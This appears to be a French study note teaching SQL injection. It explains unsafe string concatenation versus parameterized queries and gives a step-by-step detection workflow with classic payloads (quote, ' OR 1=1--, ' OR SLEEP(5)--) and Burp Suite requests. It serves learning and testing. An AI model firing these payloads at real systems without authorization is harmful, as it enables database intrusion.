
# 🎯 Objectif

Comprendre **UNE chose clé** :

> 🔥 **SQLi = concaténation dangereuse**

---

# 🧩 1. C’est quoi la concaténation ?

👉 Concaténation = **coller du texte**

---

## Exemple simple (hors SQL)

```
"Bonjour " + "Ilyass"
```

👉 Résultat :

```
Bonjour Ilyass
```

---

# 🔥 2. Maintenant en backend (IMPORTANT)

Le backend fait :

```
"SELECT * FROM users WHERE username = '" + input + "'"
```

---

## 🧠 Décomposition

```
[1] SELECT * FROM users WHERE username = '
[2] input (toi)
[3] '
```

👉 le backend colle tout → concaténation

---

# 🎯 Exemple normal

```
input = admin
```

👉 Résultat :

```
SELECT * FROM users WHERE username = 'admin'
```

✔️ OK

---

# 💥 Exemple SQLi

```
input = admin' OR 1=1--
```

👉 Résultat :

```
SELECT * FROM users WHERE username = 'admin' OR 1=1--'
```

---

## 🧠 Ce qu’il se passe

```
'admin'        ← texte normal
OR 1=1         ← SQL exécuté
--             ← ignore la fin
```

💥 Tu contrôles la requête

---

# 🔥 3. Pourquoi `'` est important

👉 `'` sert à :

- ouvrir une chaîne SQL
- fermer une chaîne SQL

---

## Exemple

```
username = 'admin'
```

---

## Attaque

```
admin' OR 1=1--
```

👉 tu fais :

```
'admin' OR 1=1
```

👉 tu **sors du texte → tu passes en SQL**

---

# ⚠️ Le vrai problème

👉 Le backend fait :

```
" ... '" + input + "'"
```

👉 donc :

> ❗ il mélange texte SQL + input utilisateur

---

# 🧠 4. Cas sécurisé (important)

```
SELECT * FROM users WHERE username = ?
```

👉 input séparé

👉 même si :

```
admin' OR 1=1--
```

👉 ça reste du texte

✔️ pas de faille

---

# 🔥 5. Détection SQLi (très important)

---

## 🧪 Étape 1 — test `'`

```
'
```

👉 tu testes :

> “est-ce que je casse la requête ?”

---

## 🧠 Résultat possible

- erreur → 💥 SQLi probable
- comportement bizarre → suspect
- rien → continuer

---

# 🧪 Étape 2 — test logique

```
' OR 1=1--
' OR 1=2--
```

---

## 🎯 Analyse

|Payload|Résultat|
|---|---|
|1=1|fonctionne|
|1=2|ne fonctionne pas|

👉 💥 SQLi confirmée

---

# 🧪 Étape 3 — test timing

```
' OR SLEEP(5)--
```

👉 si réponse lente :

💥 SQLi confirmée

---

# ⚙️ 6. Avec Burp Suite

---

## Étape 1 — Intercept

```
GET /search?name=phone
```

---

## Étape 2 — Repeater

Send to Repeater

---

## Étape 3 — tests

```
GET /search?name='
GET /search?name=' OR 1=1--
GET /search?name=' OR 1=2--
GET /search?name=' OR SLEEP(5)--
```

---

## 🔍 À observer

- différence de contenu
- nombre de résultats
- temps de réponse
- erreurs

---

# 🧠 7. Résumé mental

👉 SQLi =

```
concaténation + input contrôlé
```

---

👉 Si le backend fait :

```
"... '" + input + "'"
```

👉 alors :

```
🔥 danger
```

---

# ⚡ Workflow simple

```
1. '
2. ' OR 1=1--
3. ' OR 1=2--
4. ' OR SLEEP(5)--
```

---

# 💬 Phrase clé

> 👉 Tu ne hacks pas la DB  
> 👉 Tu casses une phrase construite par le backend